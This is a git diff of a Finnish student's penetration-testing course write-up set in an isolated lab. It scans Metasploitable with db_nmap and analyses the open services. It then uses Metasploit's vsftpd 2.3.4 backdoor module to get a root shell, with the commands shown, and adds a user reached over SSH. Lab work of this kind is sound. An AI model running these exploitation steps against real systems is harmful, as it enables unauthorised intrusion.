@@ -103,7 +103,7 @@ käynnistin koneen ja kirjauduin sisään.
 - Kalin ja Metasploitablen välillä on host-only network, niin että porttiskannatessa ym. koneet on eristetty intenetistä, mutta ne saavat yhteyden toisiinsa
 - Osoita eri komennoilla, että Internet-yhteys katkeaa: 'ping 1.1.1.1', 'ping www.google.com', 'curl www.google.com'
 
-UTM-virtualisointiohjelmasta olen valinnut molempiin virtuali koneisiin Host-Only -vaihtoehdon. Tällä hetkellä Kali eikä Metasploitable ole yhteydessä internetiin ja testin suoritin pingaamalla googlea <code>ping 8.8.8.8</code>.
+UTM-virtualisointiohjelmasta olen valinnut molempiin virtuali koneisiin Host-Only -vaihtoehdon. Tällä hetkellä Kali eikä Metasploitable ole yhteydessä internetiin ja testin suoritin eri komennoilla.
 Kali:
 <img src="/images/testi1.png" alt="" title="" width="70%" height="70%">
 Metasploitable:
@@ -116,10 +116,78 @@ Pingasin koneilla myös toisiaan testatakseni, että yhteys toisiinsa löytyy.
 
 
 ## d) Etsi Metasploitable porttiskannaamalla (db_nmap -sn). Tarkista selaimella, että löysit oikean IP:n - Metasploitablen weppipalvelimen etusivulla lukee Metasploitable. Katso, ettei skannauspaketteja vuoda Internetiin - kannattaa irrottaa koneet netistä skannatessa.
+
+Käynnistin Metasploitablen tarvitseman tietokannan komennolla <code>sudo systemctl start postgresql</code>. Seuraavaksi annoin komennon <code>sudo msfdb init</code>, mikä käynnistää PostgreSQL-tietokannan ja suorittaa alustavat konfiguraatiot sekä asettaa ympäristömuuttujat ja luo tarvittavat tiedostot ja hakemistot. Avasin Metasploit Framework- työkalun komennolla <code>msfconsole</code>. Sen jälkeen annoin komennon <code>db_nmap -sn 192.168.12.3</code>, joka suorittaa Nmap ping-skannauksen määritettyyn IP-osoitteeseen ja päivittää tiedot Metasploit-tietokantaan. <code>-sn</code>-vaihtoehto ohjeistaa Nmapia suorittamaan host discovery -skannauksen ilman itse palvelun porttien tai palveluiden skannausta.
+
+<img src="/images/msf4.png" alt="" title="" width="70%" height="70%">
+<img src="/images/msfsivu.png" alt="" title="" width="70%" height="70%">
+
+Käytin apuna: https://github.com/vilppuuu/tunkeutumistestaus/blob/main/h2_laksyt.md
+
 ## e) Porttiskannaa Metasploitable huolellisesti (db_nmap -A -p0-). Analysoi tulos. Kerro myös ammatillinen mielipiteesi (uusi, vanha, tavallinen, erikoinen), jos jokin herättää ajatuksia.
+Skannasin Metasploitablen komennolla <code>db_nmap -A -p0- 192.168.12.3</code>.
+
+-<code>A</code>: Suorittaa aggressiivisen skannauksen, joka sisältää käyttöjärjestelmän havaitsemisen, versiotietojen keräämisen, palveluiden tunnistamisen, sekä muita yksityiskohtaisia tietoja.
+-<code>-p0-</code>: Skannaa kaikki portit nollasta eteenpäin.
+
+<img src="/images/pdnmap.png" alt="" title="" width="70%" height="70%">
+
+Tulostus oli pitkä. Tämä tarkoittaa, että avoimia portteja ja palveluja on käytössä kohteessa harvinaisen paljon. Tämä on huolestuttavaa tietoturvan kannalta, sillä useampi avonainen portti laajentaa hyökkäyspintaa. Muutamat erikoiset havainnot, joita tein:
+- Useassa palvelussa on vanhentuneet järjestelmät, eikä niitä ole päivitetty. Tämä mahdollistaa hyökkääjän käyttää löydettyjä ja tunnettuja exploiteja palveluihin (esim. OpenSSH 4.7p1 ja Apache httpd 2.2.8
+- UnrealIRCd-palvelimen ylläpitäjän sähköpostiosoite näkyy skannauksessa portissa 6667 ja 6697. Tietoa voidaan käyttää hyväksi jatkohyökkäyksissä.
+- portissa 21 on FTP-palvelin, johon voi kirjautua anonyymisti ilman salasanaa
+- telnet, portti 23 avoinna: Telnet lähettää käyttäjän kirjautumistiedot selkokielisenä, joten se ei salaa tietoliikennettä. Tämä tarkoittaa, että käyttäjänimet, salasanat ja kaikki muut tiedot ovat helposti nähtävissä, jos joku pystyy sieppaamaan verkkoliikenteen.
+
 ## f) Murtaudu Metasploitablen VsFtpd-palveluun Metasploitilla (search vsftpd, use 0, set RHOSTS - varmista osoite huolella, exploit, id)
+
+<code>db_nmap -sV -p 21 192.168.12.3</code>
+
+`````
+msf6 > db_nmap -sV -p 21 192.168.12.3
+[*] Nmap: Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-11 23:59 EET
+[*] Nmap: Nmap scan report for 192.168.12.3
+[*] Nmap: Host is up (0.0017s latency).
+[*] Nmap: PORT   STATE SERVICE VERSION
+[*] Nmap: 21/tcp open  ftp     vsftpd 2.3.4
+[*] Nmap: Service Info: OS: Unix
+[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 13.36 seconds
+`````
+Skannauksesta näemme, että käytössä on versio vsftpd 2.3.4. 
+
+<code>search vsftpd</code> ja backdoor-moduuli versiolle 2.3.4 löytyi. Käytämme sitä komennolla: <code>use exploit/unix/ftp/vsftpd_234_backdoor</code>.
+
+````
+msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
+[*] No payload configured, defaulting to cmd/unix/interact
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set rhosts 192.168.12.3
+rhosts => 192.168.12.3
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
+````
+Ja yhteys on luotu ja kirjauduttu root-käyttäjänä.
+
+<img src="/images/exploit1.png" alt="" title="" width="70%" height="70%">
+<img src="/images/exploit2.png" alt="" title="" width="70%" height="70%">
+
+
 ## g) Parempi sessio. Tee vsftpd-hyökkäyksestä saadusta sessiosta parempi. (Voit esimerkiksi päivittää sen meterpreter-sessioksi, laittaa tty:n toimimaan tai tehdä uuden käyttäjän ja ottaa yhteyden jollain tavallisella protokollalla)
+
+Loin uuden käyttäjän "user1" komennolla <code>sudo adduser user1</code>. Skippasin enterillä loput täytettävät infot ja kirjauduin sessiosta ulos. Menin Kalin terminaaliin ja otin yhteyttä SSH-yhteydellä luomalle käyttäjälleni komennolla <code>ssh user1@192.168.12.3</code>, mutta sain virheilmoituksen:
+
+````
+┌──(kali㉿kali)-[~]
+└─$ ssh user1@192.168.12.3         
+Unable to negotiate with 192.168.12.3 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss
+````
+ChatGPT auttoi neuvomaan kokeilemaan seuraavaa komentoa: <code>ssh -oHostKeyAlgorithms=+ssh-rsa user1@192.168.12.3</code> ja pääsin sillä kirjautumaan käyttäjälleni. 
+<img src="/images/user.png" alt="" title="" width="70%" height="70%">
+
+ChatGPT:n mukaan: "Virheilmoituksesi "Unable to negotiate with 192.168.12.3 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss" viittaa siihen, että SSH-asiakas ei löytänyt yhteensopivaa avaintyyppiä, kun yritettiin neuvotella SSH-yhteyttä palvelimen kanssa.Tämä voi johtua siitä, että SSH-palvelin tukee avaintyyppejä, joita SSH-asiakkaasi ei tue. Voit yrittää ratkaista tämän ongelman lisäämällä -o-vaihtoehdon käyttäen HostKeyAlgorithms-määritystä. <code>ssh -oHostKeyAlgorithms=+ssh-rsa user1@192.168.12.3</code> -komento määrää käyttämään ssh-rsa-avaintyyppiä neuvotteluissa."
+
+
 ## h) Etsi, tutki ja kuvaile jokin hyökkäys ExploitDB:sta. (Tässä harjoitustehtävässä pitää hakea ja kuvailla hyökkäys, itse hyökkääminen jää vapaaehtoiseksi lisätehtäväksi)
+
+
 ## i) Etsi, tutki ja kuvaile hyökkäys 'searchsploit' -komennolla. Muista päivittää. (Tässä harjoitustehtävässä pitää hakea ja kuvailla hyökkäys, itse hyökkääminen jää vapaaehtoiseksi lisätehtäväksi. Valitse eri hyökkäys kuin edellisessä kohdassa.)
 ## j) Kokeile vapaavalintaista haavoittuvuusskanneria johonkin Metasploitablen palveluun. (Esim. nikto, wpscan, openvas, nessus, nucleus tai joku muu)
 ## k) Kokeile jotain itsellesi uutta työkalua, joka mainittiin x-kohdan läpikävelyohjeessa.
